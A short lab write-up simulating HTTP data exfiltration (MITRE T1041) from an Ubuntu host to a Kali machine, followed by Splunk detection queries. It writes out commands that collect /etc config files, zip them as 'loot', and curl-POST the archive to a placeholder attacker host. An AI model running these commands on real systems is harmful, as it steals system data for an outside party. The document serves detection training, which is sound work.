#  Data Exfiltration via HTTP (MITRE ATT&CK T1041)

## 📌 Objective
Simulate a data exfiltration technique using HTTP protocol to understand how attackers transfer sensitive data from compromised systems to external destinations. Detect and analyze this activity using Splunk.

---

## 💡 MITRE Technique: T1041 - Exfiltration Over Command and Control Channel

Attackers often exfiltrate data using existing command and control (C2) channels, including HTTP or HTTPS. This technique helps avoid detection by blending in with normal web traffic.

---

## 🛠️ Lab Setup

| Component         | Details                              |
|------------------|--------------------------------------|
| Attacker Machine | Kali Linux (HTTP Server on Port 8000)|
| Victim Machine   | Ubuntu (Target for exfiltration)     |
| Monitoring Tool  | Splunk (Log Source: Syslog)          |

---

## ⚙️ Attack Simulation

1. **Target Data Collection**  
   - Collected all readable `.conf` files from `/etc`:
     ```
     find /etc -type f -name "*.conf" -readable -exec cp {} /tmp/exfil/ \;
     ```

2. **Compression (Data Staging)**  
   - Archive the data:
     ```
     zip -r data_loot.zip /tmp/exfil
     ```

3. **Exfiltration using `curl`**
   - Send the zip file to the attacker's HTTP server:
     ```
     curl -X POST -F "file=@data_loot.zip" http://<attacker-ip>:8000/upload
     ```

---

## 🔍 Detection in Splunk

### 1. Detect `curl` activity from logs:
index=* curl



### 2. Detect any external IP access:
index=* source="/var/log/syslog" curl OR "<attacker-ip>"


### 3. Look for `zip` and data staging:
index=* "zip -r" OR "/tmp/exfil"


---

## ✅ Key Takeaways

- Data exfiltration can be hidden in plain sight using common tools like `curl`.
- Syslog monitoring and keyword-based detection can help surface suspicious behaviors.
- MITRE mappings like T1041 help contextualize threats in a real-world framework.
